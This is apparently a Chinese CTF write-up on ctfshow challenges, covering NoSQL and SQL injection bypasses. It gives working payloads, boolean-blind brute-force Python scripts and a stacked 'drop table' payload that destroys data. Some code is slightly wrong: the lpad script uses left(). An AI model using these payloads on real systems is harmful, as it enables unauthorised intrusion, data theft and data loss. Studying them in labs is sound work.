  NoSQL，全称是“Not Only SQL”（不仅仅是SQL），指的是非关系型的数据库管理系统。例如：文档数据库（mongodb）、键值数据库（redis）、列族数据库（Apache Cassandra）、图数据库（Neo4j）.....

#### nosql注入介绍

参考文章：[NoSQL注入小笔记 – Ruilin](http://rui0.cn/archives/609)

前端登录检验代码如下：

```js
app.post(‘/login’, async (req, res) => {
  const { username, password } = req.body;
  // 不安全的查询：直接将用户输入的对象用于查询
  const user = await db.collection(‘users’).findOne({
    username: username,
    password: password
  });
  // ...如果user存在，则登录成功
});
```

正常登录请求如下：

```json
{
    “username”: “admin”,
    “password”: “123456”
}
```

恶意payload如下：

```json
{
    “username”: “admin”,
    “password”: { “$ne”: “” }
}
```

- **`$ne` 操作符** 代表 “not equal” （不等于）。
- 则原句改为：在`users`集合中，查找一个 `username` 为 “admin” **且** `password` **不等于空字符串** (`$ne`: “”) 的文档。密码不为空即可登录成功。

好的，这是您提供的MongoDB查询操作符整理成的Markdown表格：

| 操作符   | 含义                   | 示例                                                         |
| :------- | :--------------------- | :----------------------------------------------------------- |
| `$gt`    | 大于 (`>`)             | `db.collection.find({'age': {'$gt': 18}})`                   |
| `$lt`    | 小于 (`<`)             | `db.collection.find({'age': {'$lt': 60}})`                   |
| `$gte`   | 大于等于 (`>=`)        | `db.collection.find({'age': {'$gte': 18}})`                  |
| `$lte`   | 小于等于 (`<=`)        | `db.collection.find({'age': {'$lte': 60}})`                  |
| `$ne`    | 不等于 (`!=` 或 `<>`)  | `db.collection.find({'status': {'$ne': 'disabled'}})`        |
| `$in`    | 包含于 (in)            | `db.collection.find({'status': {'$in': ['active', 'pending']}})` |
| `$nin`   | 不包含于 (not in)      | `db.collection.find({'status': {'$nin': ['deleted', 'banned']}})` |
| `$all`   | 全部包含 (all)         | `db.collection.find({'tags': {'$all': ['mongodb', 'database']}})` |
| `$or`    | 或 (or)                | `db.collection.find({'$or': [{'status': 'active'}, {'age': {'$lt': 18}}]})` |
| `$not`   | 反匹配 (not)           | `db.collection.find({'age': {'$not': {'$gt': 50}}})`         |
| `$regex` | 正则表达式（模糊查询） | `db.customer.find({'name': {'$regex': '.*s.*'} })`           |

#### 重言式注入

  这里用ctfshow-web250为例，题目如下：

![image-20260301153015568](posts/530fceb2/images/image-20260301153015568.webp)

查询语句直接接收然后使用mongodb查询，查询结果大于0即可返回flag

重言式注入也是永真式注入，只让查询条件为真即可

```payload
username=admin&password[$ne]=1
```

+ username为admin，密码不为1即可登录成功

```paylaod
username[$regex]=.&password[$regex]=.
```

+ 账户和密码正则匹配所有字符，即登录成功

##### 重演式布尔盲注

  这里用ctfshow-web253为例，题目如下：

![image-20260301160221306](posts/530fceb2/images/image-20260301160221306.webp)

使用永真式登录之后只会回显登录成功，错误则登录失败，所以可以打布尔盲注

```python
import requests

url="http://93faad55-ef7a-4d80-aacc-d9a8f5596986.challenge.ctf.show/api/"
param=""
# 传入参数为ascii码中所有可以打印字符
strings="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}-_!@#$%^&()"

flag=''

proxys = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080"
}

# 1. 无限往url发送post数据包
while True:
    # 从param字符串中获取一个字符，添加到data中，并发送post请求
    # 爆破账号
    # for i in strings:
    #     parami = flag + i
    #     data = {
    #         'username[$regex]': f"^{parami}",
    #         'password[$regex]': f"."
    #     }
    #     r = requests.post(url, data=data, proxies=proxys)
    #     # 2. 获取requests请求的回显，并判断回显内容中是否有登陆成功;
    #     if '登陆成功' in r.json().get('msg', ''):
    #         if parami in 'admin':
    #             continue
    #         flag += i
    #         print(flag)
    #         break

    # 爆破密码
    for i in strings:
        parami = flag + i
        data = {
            # 从上方得到的账户
            'username[$regex]': f"flag",
            'password[$regex]': f"^{parami}"
        }
        r = requests.post(url, data=data, proxies=proxys)
        # 2. 获取requests请求的回显，并判断回显内容中是否有登陆成功;
        if '登陆成功' in r.json().get('msg', ''):
            flag += i
            print(flag)
            break
```

### 宽字节注入

参考文章：[2025 sqli-labs通关流程 手把手教 详细讲解_sqlilabs-CSDN博客](https://blog.csdn.net/2301_76913435/article/details/145601627)

  mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个汉字（前一个 ascii 码大于 128 才能到汉字的范围）。因此我们在此想办法将'前面添加的\除掉，一般有两种思路：

%df 吃掉 \。具体的原因是 urlencode(\') = %5c%27，我们在%5c%27 前面添加%df，形成%df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此时%df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。
将 \’ 中的 \ 过滤掉，例如可以构造 %5c%5c%27 的情况，后面的%5c 会被前面的%5c给注释掉。这也是 bypass 的一种方法。

  这里以ctfshow-web552为例，题目如下：

![image-20260302203355685](posts/530fceb2/images/image-20260302203355685.webp)

还是进行id注入，后端源码如下：

![image-20260302203549000](posts/530fceb2/images/image-20260302203549000.webp)

简单来说就是对单引号和双引号做了转义处理，按照宽字节注入的思想，我们只用将转义字符吃掉，或者也转义掉即可

在%27前添加%df或者%5c即可，其他的都是依旧，我这里就只给最终的paylaod(这题将转义字符也过滤了，所以只能添加%df)

`mysqli_real_escape_string`和`addslashes`都是转义字符的函数，都可以用宽字节注入进行绕过

```payload
?id=99%df%27 union select 1,group_concat(flag4s),3 from ctfshow.flags-- a
```

如果是POST型的参数，即使用汉字将转义字符吃掉

```payload
uname=dumb汉' union select group_concat(flag4s),3 from ctfshow.flags-- a&passwd=dumb&submit=Submit
```



### http参数污染

  在处理前端的请求参数时，不同的服务器对这些参数的处理不同，从而造成了http参数污染注入

| Web服务器/应用容器    | 参数处理方式                       | 示例 (http://example.com?name=value1&name=value2)          |
| :-------------------- | :--------------------------------- | :--------------------------------------------------------- |
| **Nginx (配合PHP)**   | **取最后一个参数**                 | `$_GET['name']` 的值为 `value2`                            |
| Apache (mod_php)      | 取最后一个参数                     | `$_GET['name']` 的值为 `value2`                            |
| Apache (Tomcat/AJP)   | 取第一个参数                       | `request.getParameter("name")` 的值为 `value1`             |
| IIS (ASP.Net)         | 取所有参数，拼接成逗号分隔的字符串 | `Request.QueryString("name")` 的值为 `value1,value2`       |
| Python (Flask/Django) | 取列表                             | `request.args.getlist('name')` 返回 `['value1', 'value2']` |
| Node.js (Express)     | 取数组                             | `req.query.name` 的值为 `['value1', 'value2']`             |
| Java (Tomcat)         | 取第一个参数                       | `request.getParameter("name")` 的值为 `value1`             |

  这里以ctfshow-web549为例，题目如下：

![image-20260302200543961](posts/530fceb2/images/image-20260302200543961.webp)

给id赋值传参，回显该id的username:password,根据id进行注入，题目是在tomcat处添加了过滤器，来防止sql注入，由于同一参数参数的情况下，tomcat取第一个参数值，apache取最后一个参数值，所以注入点就在于第二个参数

这里对第二个参数正常进行union注入即可，就给最后获取到flag的payload

```payload
?id=1&id=99' union select 1,group_concat(flag4s),3 from ctfshow.flags-- a
```

### 绕过

#### 双写绕过

  原则上，所有的关键字如果只被正则匹配过滤一次，而不是递归过滤，那么所有的关键字都可以使用双写绕过



#### 回显长度有限制

  这里只用查询字段做例子，其他的查询数据库、表、列都是一样的加`limit`和`group_concat`

```mysql
1' union select group_concat(username) ,group_concat(password),3 from ctfshow_user2 limit 1,1-- a
```

#### 回显内容有限制

  这里用ctfshow-web173为例子，题目如下

![image-20260122212951365](posts/530fceb2/images/image-20260122212951365.webp)

  对输出的内容进行正则匹配，如果没有匹配到flag，才会输出查询成功

前面获取数据库名、表名、字段名就不重复了，就是union注入的常规套路，直接到最后一步

对输出的内容进行进制转换，或者你采用编码都可以，直接使用**hex转换**为16进制

```mysql
1' union select hex(username),password,3 from ctfshow_user3-- a
```

![image-20260122213446187](posts/530fceb2/images/image-20260122213446187.webp)

最后16进制转ascii即可拿到flag

![image-20260122213608562](posts/530fceb2/images/image-20260122213608562.webp)

> ctfshow{b65962ff-25ea-4603-a222-9aaf289644a2}

#### 回显内容不允许出现数字

  这里以ctfshow-web174为例，题目如下：

![image-20260122221413974](posts/530fceb2/images/image-20260122221413974.webp)

这里对输出进行了过滤，只有在没有flag以及没有数字的情况下，才会进行回显正确

绕过方法：对输出内容进行`replace`替换

```mysql
replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'9','nine'),'8','eight'),'7','seven'),'6','six'),'5','five'),'4','four'),'3','three'),'2','two'),'1','one'),'0','zero')
```

`replace(str, from_str, to_str)`:`str`是指原始字符串，`from_str`是指需要替换字符串，`to_str`是指：替换后字符串，上述sql语句即是将原始password中9替换为nine，得到newpassword，再将newpassword中的8替换为eight,后面以此类推，从而达到输出没有数字的情况

前面获取数据库名和获取表名都是和正常union注入一样，如果输出有数字的，就使用`replace`进行替换，这里就给出最终的查询数据项的sql语句

```mysql
1' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'9','nine'),'8','eight'),'7','seven'),'6','six'),'5','five'),'4','four'),'3','three'),'2','two'),'1','one'),'0','zero') from ctfshow_user4 where username='flag'-- a
```

成功拿到替换后的password

![image-20260129163152118](posts/530fceb2/images/image-20260129163152118.webp)

> ctfshow{onedtwoceightnineninetwo-fiveatwotwo-fourdsevenseven-bcdsix-bazerodbfeightezerofoureightone}

转换回来的python脚本：

```python
def english_to_arabic_v2(text):
    # 英文数字到阿拉伯数字的映射字典
    number_map = {
        'zero': '0', 'one': '1', 'two': '2', 'three': '3', 'four': '4',
        'five': '5', 'six': '6', 'seven': '7', 'eight': '8', 'nine': '9'
    }
    
    result = text.lower()  # 转为小写方便匹配
    
    # 将所有的英文数字转换为阿拉伯数字
    for word, digit in number_map.items():
        result = result.replace(word, digit)
    
    return result

original_string = "ctfshow{onedtwoceightnineninetwo-fiveatwotwo-fourdsevenseven-bcdsix-bazerodbfeightezerofoureightone}"
converted_string = english_to_arabic_v2(original_string)

print("原始字符串:")
print(original_string)
print("\n转换后字符串:")
print(converted_string)
```

![image-20260129163817851](posts/530fceb2/images/image-20260129163817851.webp)

拿到flag

>ctfshow{1d2c89n92-5a22-4d77-bcd6-ba0dbf80z04081}

#### 输入内容有flag等字符限制

##### like绕过

  这里用ctfshow-web182为例子，题目如下

![image-20260202203254994](posts/530fceb2/images/image-20260202203254994.webp)

waf显示：过滤了可以绕过空格的之类tab，还过滤了用于sql写马的file和into，过滤了union查询的select，还过滤了flag查询参数，这里我们就可以使用`like`进行模糊匹配查询

```mysql
1'or(username)like('fl%')--%01
```

`like('fl%')`:对开头是fl进行贪婪匹配并进行查询

##### regexp绕过

这里用ctfshow-web182为例子，题目如下

![image-20260202203254994](posts/530fceb2/images/image-20260202203254994.webp)

waf显示：过滤了可以绕过空格的之类tab，还过滤了用于sql写马的file和into，过滤了union查询的select，还过滤了flag查询参数，这里我们就可以使用`regexp`进行正则匹配查询

```mysql
1'or(username)regexp('^fl.?')--%01
```

`regexp('^fl.?')`:正则表达式匹配，以fl开头任意字符匹配0次或1次

#### select过滤

##### 大小写绕过

  这里用ctfshow-web176为例子，题目如下

![image-20260130174927610](posts/530fceb2/images/image-20260130174927610.webp)

  返回逻辑显示：有waf对输入进行拦截，经过测试，发现是select过滤

select大小写绕过即是将union注入的select替换成大写`Select`即可

1. 获取数据库

	```mysql
	1' union Select 1,2,database()-- a
	```

2. 获取数据表

	```mysql
	1' union Select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-- a
	```

3. 获取数据列

	```mysql
	1' union Select group_concat(column_name),2,3 from information_schema.columns where table_name='ctfshow_user' and table_schema=database()-- a
	```

4. 获取数据项

	```mysql
	1' union Select group_concat(username),group_concat(password),3 from ctfshow_user-- a
	```

##### handler绕过

  这里用ctfshow-web225为例子，题目如下：
![image-20260223140527386](posts/530fceb2/images/image-20260223140527386.webp)

题目提示：堆叠注入，查询语句：username传参，三列回显，返回逻辑：waf拦截SQL注入写马，union注入，增删改查都被拦截

绕过思路：使用等价函数handler替换select

handler与select区别，主要是handler是一行一行数据进行回显

```sql
-- SELECT：一次性的完整查询
SELECT * FROM users WHERE age > 18 ORDER BY id;

-- Handler：需要多步操作
HANDLER users OPEN;                    -- 1. 打开表
HANDLER users READ FIRST WHERE age > 18; -- 2. 读取数据
HANDLER users READ NEXT;                 -- 3. 继续读取
HANDLER users CLOSE;                     -- 4. 关闭表
```

1. 堆叠注入查看数据库

	```mysql
	ctfshow';show databases;
	```

2. 查看数据表

	```mysql
	ctfshow';show tables;
	```

3. 查看数据列

	```mysql
	ctfshow';show columns from ctfshow_flagasa;
	```

4. 查看具体数据项

	```mysql
	ctfshow';handler ctfshow_flagasa open;handler ctfshow_flagasa read first;
	```

	

#### where过滤

##### having等价函数绕过

  这里用ctfshow-web184为例子，题目如下

![image-20260202210929414](posts/530fceb2/images/image-20260202210929414.webp)

waf如图所示，过滤了空格的tab之类的绕过，过滤了select查询，sql注入写马，or连接符也过滤了,`=`也被过滤，单双引号也被过滤，并且查询结果只返回当前有多少条数据，好消息是这关没有过滤空格，其实过滤了也一样，括号绕过即可

这个关卡是在前面的基础上写的，已知条件：已知表`ctfshow_user`，已知列`pass`

`having`与`where`的区别就是having只能在`group by`后面使用

```mysql
tableName=ctfshow_user group by pass having pass like 0x63746673686F7725
```

`0x63746673686F7725`:mysql自动识别十六进制，这里是`ctfshow%`

整个条件即是根据pass进行排序，并且筛选条件为模糊查询ctfshow为开头的pass

![image-20260202212553477](posts/530fceb2/images/image-20260202212553477.webp)

成功回显为1，锁定了flag数据项

最后使用python脚本布尔盲注出flag，脚本具体流程看web183的wp

```python
import requests

url="http://4d7f2242-d591-47cf-b8c5-958d7b5c3610.challenge.ctf.show/select-waf.php"
param=""
# 传入参数为ascii码中所有可以打印字符
strings="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}-_"

flag='ctfshow'

proxys = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080"
}

# 1. 无限往url发送post数据包
while True:
    # 从param字符串中获取一个字符，添加到data中，并发送post请求
    for i in strings:
        param=flag+i
        hex_param=param.encode('utf-8').hex()
        data = {'tableName': f"ctfshow_user group by pass having pass like 0x{hex_param}25"}
        r = requests.post(url, data=data, proxies=proxys)
        # 2. 获取requests请求的回显，并判断回显内容中是否有$user_count = 1;
        if '$user_count = 1;' in r.text:
            flag += i
            print(flag)
            break
```

#### ascii过滤

##### ord等价函数绕过

  这里用ctfshow-web191为例子，题目如下

![image-20260203175646501](posts/530fceb2/images/image-20260203175646501.webp)

查询语句是根据where的筛选条件，进行pass查询
返回逻辑检测，密码输入只能为数字，密码判断即为登录成功，waf拦截，用户名不能sql注入写马，不能用ascii码函数

这里我们使用ord等价函数代替ascii码

`ord`与`ascii`的区别：ord适用于多字节字符，ascii码适用于单字节字符，对于盲注而言，不会影响结果

接下来就是正常的布尔盲注了

1. 获取数据库长度

	```mysql
	admin' and length(database())=1-- a
	```

2. 获取数据库

	```mysql
	admin' and ord(substr(database(),1,1))=1-- a
	```

3. 获取数据表长度

	```mysql
	admin' and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=1-- a
	```

4. 获取数据表

	```mysql
	admin' and ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=1-- a
	```

5. 获取列长度

	```mysql
	admin' and length((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g' and table_schema=database()))=1-- a
	```

6. 获取列

	```mysql
	admin' and ord(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g' and table_schema=database()),1,1))=1-- a
	```

7. 获取f1ag这一列的数据项长度

	```mysql
	admin' and length((select group_concat(f1ag) from ctfshow_fl0g))=1-- a
	```

8. 获取f1ag这一列的数据项

	```mysql
	admin' and ord(substr((select group_concat(f1ag) from ctfshow_fl0g ),1,1))=1-- a
	```


##### 直接使用判断substr截取字符

  这里用ctfshow-web192为例子，题目如下

![image-20260206175942442](posts/530fceb2/images/image-20260206175942442.webp)

查询语句是根据where的筛选条件，进行pass查询
返回逻辑检测，密码输入只能为数字，密码判断即为登录成功，waf拦截，用户名不能sql注入写马，不能用ascii码和ord函数

这里我们采取的绕过是直接判断当前substr截取字符是否正确即可

接下来就是正常的布尔盲注了

1. 获取数据库长度

	```mysql
	admin' and length(database())=1-- a
	```

2. 获取数据库(爆破x,x用引号包裹，不然数字爆破时，sql弱比较会一直成立)

	```mysql
	admin' and substr(database(),1,1)='x'-- a
	```

3. 获取数据表长度

	```mysql
	admin' and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=1-- a
	```

4. 获取数据表(爆破x,x用引号包裹，不然数字爆破时，sql弱比较会一直成立)

	```mysql
	admin' and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='x'-- a
	```

5. 获取列长度

	```mysql
	admin' and length((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g' and table_schema=database()))=1-- a
	```

6. 获取列(爆破x,x用引号包裹，不然数字爆破时，sql弱比较会一直成立)

	```mysql
	admin' and substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g' and table_schema=database()),1,1)='x'-- a
	```

7. 获取f1ag这一列的数据项长度

	```mysql
	amdin' and length((select group_concat(f1ag) from ctfshow_fl0g))=1-- a
	```

8. 获取f1ag这一列的数据项(爆破x,x用引号包裹，不然数字爆破时，sql弱比较会一直成立)

	```mysql
	admin' and substr((select group_concat(f1ag) from ctfshow_fl0g ),1,1)='x'-- a
	```

#### substr过滤

##### mid,substring等价函数绕过

  这里用ctfshow-web193为例子，题目如下

![image-20260206183219467](posts/530fceb2/images/image-20260206183219467.webp)

查询语句是根据where的筛选条件，进行pass查询
返回逻辑检测，密码输入只能为数字，密码判断即为登录成功，waf拦截，用户名不能sql注入写马，不能用ascii码和ord，substr函数

**在MySQL中，MID()函数和SUBSTR()函数（或SUBSTRING()）是完全相同的，它们是同义词，功能完全一致。**

修改函数名即可,下面只有mid的例子，substring是一样的

1. 获取数据库长度

	```mysql
	admin' and length(database())=1-- a
	```

2. 获取数据库(爆破x,x用引号包裹，不然数字爆破时，sql弱比较会一直成立)

	```mysql
	admin' and mid(database(),1,1)='x'-- a
	```

3. 获取数据表长度

	```mysql
	admin' and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=1-- a
	```

4. 获取数据表(爆破x,x用引号包裹，不然数字爆破时，sql弱比较会一直成立)

	```mysql
	admin' and mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='x'-- a
	```

5. 获取列长度

	```mysql
	admin' and length((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g' and table_schema=database()))=1-- a
	```

6. 获取列(爆破x,x用引号包裹，不然数字爆破时，sql弱比较会一直成立)

	```mysql
	admin' and mid((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g' and table_schema=database()),1,1)='x'-- a
	```

7. 获取f1ag这一列的数据项长度

	```mysql
	amdin' and length((select group_concat(f1ag) from ctfshow_fl0g))=1-- a
	```

8. 获取f1ag这一列的数据项(爆破x,x用引号包裹，不然数字爆破时，sql弱比较会一直成立)

	```mysql
	admin' and mid((select group_concat(f1ag) from ctfshow_fl0g ),1,1)='x'-- a
	```

##### left,right等价函数绕过

  这里用ctfshow-web193为例子，题目如下

![image-20260206183219467](posts/530fceb2/images/image-20260206183219467.webp)

查询语句是根据where的筛选条件，进行pass查询
返回逻辑检测，密码输入只能为数字，密码判断即为登录成功，waf拦截，用户名不能sql注入写马，不能用ascii码和ord，substr函数

这里我们采取的绕过使用`left,right`等价函数绕过

`left(string,length)`:string表示需要截取的字符串，length表示需要从左截取的长度

`right(string,length)`:string表示需要截取的字符串，length表示需要从右截取的长度

先获取需要爆破数据的长度，然后跑脚本即可

1. 获取数据库长度

	```mysql
	admin' and length(database())=1-- a
	```

2. 获取数据表长度

	```mysql
	admin' and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=1-- a
	```

3. 获取列长度

	```mysql
	admin' and length((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g' and table_schema=database()))=1-- a
	```

4. 获取f1ag这一列的数据项长度

	```mysql
	amdin' and length((select group_concat(f1ag) from ctfshow_fl0g))=1-- a
	```

这里只写了left的绕过脚本，right的修改函数名即可

```python
import requests

url="http://537913cd-270f-408a-b286-a14577430858.challenge.ctf.show/api/"
param=""
# 传入参数为ascii码中所有可以打印字符
strings="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}-_,./;'[]"

flag=''

proxys = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080"
}

# 1. 无限往url发送post数据包
while True:
    # 爆破数据的长度
    for i in range(1,45+1):
        # 从param字符串中获取一个字符，添加到data中，并发送post请求
        for j in strings:
            param = flag + j
            data = {
                # 爆破数据库名
                # 'username': f"admin' and left(database(),{i})='{param}'-- a",
                # 爆破所有表名
                # 'username': f"admin' and left((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i})='{param}'-- a",
                # 爆破所有列名
                # 'username': f"admin' and left((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg' and table_schema=database()),{i})='{param}'-- a",
                # 爆破具体数据项
                'username': f"admin' and left((select group_concat(f1ag) from ctfshow_flxg ),{i})='{param}'-- a",
                'password':'1'
            }
            r = requests.post(url, data=data, proxies=proxys)
            # 2. 获取requests请求的回显，并判断回显内容中是否有\u5bc6\u7801\u9519\u8bef;
            if '密码错误' in r.json().get('msg',''):
                flag += j
                print(flag)
                break
```

##### lpad，rpad等价函数绕过

  这里用ctfshow-web194为例子，题目如下

![image-20260206200849319](posts/530fceb2/images/image-20260206200849319.webp)

查询语句是根据where的筛选条件，进行pass查询
返回逻辑检测，密码输入只能为数字，密码判断即为登录成功，waf拦截，用户名不能sql注入写马，不能用ascii码和ord，substr，left，right，substring函数

这里我们采取的绕过使用`lpad,rpad`等价函数绕过，`padstr=''`即可

`lpad(str,len,padstr)`:str表示需要返回的字符串，len小于str时，相当于从左截取字符串长度等于left的效果，大于时则填充padstr

`rpad(str,len,padstr)`:str表示需要返回的字符串，len小于str时，相当于从左截取字符串长度等于left的效果，大于时则右填充padstr

先获取需要爆破数据的长度，然后跑脚本即可

1. 获取数据库长度

	```mysql
	admin' and length(database())=1-- a
	```

2. 获取数据表长度

	```mysql
	admin' and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=1-- a
	```

3. 获取列长度

	```mysql
	admin' and length((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g' and table_schema=database()))=1-- a
	```

4. 获取f1ag这一列的数据项长度

	```mysql
	amdin' and length((select group_concat(f1ag) from ctfshow_fl0g))=1-- a
	```

这里只写了lpad的绕过脚本，rpad的修改函数名即可

```python
import requests

url="http://537913cd-270f-408a-b286-a14577430858.challenge.ctf.show/api/"
param=""
# 传入参数为ascii码中所有可以打印字符
strings="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}-_,./;'[]"

flag=''

proxys = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080"
}

# 1. 无限往url发送post数据包
while True:
    # 爆破数据的长度
    for i in range(1,45+1):
        # 从param字符串中获取一个字符，添加到data中，并发送post请求
        for j in strings:
            param = flag + j
            data = {
                # 爆破数据库名
                # 'username': f"admin' and left(database(),{i})='{param}'-- a",
                # 爆破所有表名
                # 'username': f"admin' and left((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i})='{param}'-- a",
                # 爆破所有列名
                # 'username': f"admin' and left((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg' and table_schema=database()),{i})='{param}'-- a",
                # 爆破具体数据项
                'username': f"admin' and left((select group_concat(f1ag) from ctfshow_flxg ),{i})='{param}'-- a",
                'password':'1'
            }
            r = requests.post(url, data=data, proxies=proxys)
            # 2. 获取requests请求的回显，并判断回显内容中是否有\u5bc6\u7801\u9519\u8bef;
            if '密码错误' in r.json().get('msg',''):
                flag += j
                print(flag)
                break
```

#### update/set过滤

##### drop和create新建同名表绕过

  这里用ctfshow-web197为例子，题目如下：
![image-20260207173103628](posts/530fceb2/images/image-20260207173103628.webp)

查询语句是根据where的筛选条件，进行pass查询
返回逻辑检测，密码判断即为登录成功，waf拦截，用户名不能sql注入写马，不能用union注入update更改

drop和create新建表绕过需要有已知条件：数据库名：`ctfshow_web`数据表名：`ctfshow_user`数据列名：`username、pass`

绕过即是删除原先查询账户和密码的表，新建一个同名表，自己设置账户和密码即可，**这个方法主要是登录admin账户，账户设置为admin，即可登录admin账户(前提是单双引号没有被过滤)**，如果char被过滤，可以使用text类型来替代

```mysql
0;drop table ctfshow_user;create table ctfshow_user(`username` varchar(50),`pass` varchar(50));insert ctfshow_user(`username`,`pass`) value(0,0)
```

对于本题而言，直接新增一个用户也可以拿到flag，类似于注册的效果

```mysql
0;insert ctfshow_user(username,pass) values(0,0)
```

#### updatexml过滤

##### extractvalue等价函数绕过

  这里用ctfshow-web245为例，题目如下：

![image-20260301105935152](posts/530fceb2/images/image-20260301105935152.webp)

基于上一题可知，这题是正常的报错注入，waf拦截过滤了updatexml函数

extractvalue等价函数绕过即是使用extractvalue替换updatexml函数即可

`extractvalue(xml_fragment, xpath_expression)`:

- **xml_fragment**: XML格式的字符串
- **xpath_expression**: XPath路径表达式

1. 获取数据库名

	```mysql
	' or extractvalue(1,concat(0x7e,(select database())))-- a
	```

2. 获取数据表名

	```mysql
	' or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))-- a
	```

3. 获取数据列名

	```mysql
	' or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagsa' and table_schema=database())))-- a
	```

4. 获取数据项

	substr获取前30字符:

	```mysql
	' or extractvalue(1,concat(0x7e,substr((select flag1 from ctfshow_flagsa),1,30)))-- a
	```

	substr获取后30字符：

	```mysql
	' or extractvalue(1,concat(0x7e,substr((select flag1 from ctfshow_flagsa),31,30)))-- a
	```


##### floor报错注入

参考文章：[SQL注入（二） - Wuzhiyu - 博客园](https://www.cnblogs.com/wzy-ustc/p/14217750.html)

  这里以题目ctfshow-web246为例，题目如下：

![image-20260301112113049](posts/530fceb2/images/image-20260301112113049.webp)

报错注入的前提下，额外过滤了updatexml、extractvalue函数，这里我们采用floor报错绕过

先给一个简单的floor报错注入的例子，如下：

```mysql
select count(*) concat((select database()),0x7e,floor(rand(0)*2)) as a from users group by a

-- 这会导致：ERROR 1062 (23000): Duplicate entry 'ctfshow_web~1' for key 'group_key'
```

+ **RAND()**：产生随机数

+ **FLOOR()**：向下取整

+ **GROUP BY**：分组时会产生临时表

报错原因：floor(rand(0)*2)每次查询产生固定的随机0、1序列，group by 分组产生临时表，count对列相同数据进行计数，**group by与rand()使用时，如果临时表中没有该主键，则在插入前rand()会再计算一次**。

```text
创建临时表：group_key, count(*)
-- 1. 读取users表每行，计算x值
-- 2. 检查临时表是否有该key
-- 3. 有则count+1，无则插入新行
-- 4. 第一次记录ctfshow_web~0没有主键，rand(0)计算，临时表插入ctfshow_web~1
-- 5. 第二次记录ctfshow_web~1有主键，count(*)+1
-- 6. 第三次记录ctfshow_web~0没有主键，rand(0)计算，临时表插入ctfshow_web~1，临时表已存在ctfshow_web~1，主键重复报错
```

![image-20260301113625575](posts/530fceb2/images/image-20260301113625575.webp)

1. 获取数据库名

	```mysql
	' union select 1,count(*),concat((select database()),0x7e,floor(rand(0)*2))a from information_schema.schemata group by a-- b
	```

2. 获取数据表名（group_concat无法使用，只能使用limit了）

	```mysql
	' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2))a from information_schema.tables group by a-- b
	```

3. 获取数据列名

	```mysql
	' union select 1,count(*),concat((select column_name from information_schema.columns where table_name='ctfshow_flags' and table_schema=database() limit 1,1),0x7e,floor(rand(0)*2))a from information_schema.tables group by a-- b
	```

4. 获取数据项

	substr获取前30字符:

	```mysql
	' union select 1,count(*),concat(substr((select flag2 from ctfshow_flags),1,30),0x7e,floor(rand(0)*2))a from information_schema.tables group by a-- b
	```

	substr获取后30字符：

	```mysql
	' union select 1,count(*),concat(substr((select flag2 from ctfshow_flags),31,30),0x7e,floor(rand(0)*2))a from information_schema.tables group by a-- b
	```

##### ceil报错注入

  这里以题目ctfshow-web247为例，题目如下：

![image-20260301121628372](posts/530fceb2/images/image-20260301121628372.webp)

与上题相比多了一个过滤floor，其实floor的作用就是随机数取整而已，使用一个等价函数(ceil、round)替代即可

`ceil()`:向上取整

`round(x,y)`:将x值四舍五入为整数，y为保留多少位小数

1. 获取数据库名

	```mysql
	' union select 1,count(*),concat((select database()),0x7e,ceil(rand(0)*2))a from information_schema.schemata group by a-- b
	```

2. 获取数据表名（group_concat无法使用，只能使用limit了）

	```mysql
	' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,ceil(rand(0)*2))a from information_schema.tables group by a-- b
	```

3. 获取数据列名

	```mysql
	' union select 1,count(*),concat((select column_name from information_schema.columns where table_name='ctfshow_flagsa' and table_schema=database() limit 1,1),0x7e,ceil(rand(0)*2))a from information_schema.tables group by a-- b
	```

4. 获取数据项（包含特殊字符的列、字段、表...用``括起来）

	substr获取前30字符:

	```mysql
	' union select 1,count(*),concat(substr((select `flag?` from ctfshow_flagsa),1,30),0x7e,ceil(rand(0)*2))a from information_schema.tables group by a-- b
	```

	substr获取后30字符：

	```mysql
	' union select 1,count(*),concat(substr((select `flag?` from ctfshow_flagsa),31,30),0x7e,ceil(rand(0)*2))a from information_schema.tables group by a-- b
	```

#### sleep过滤

##### benchmark等价函数绕过

  这里用ctfshow-web217为例子，题目如下

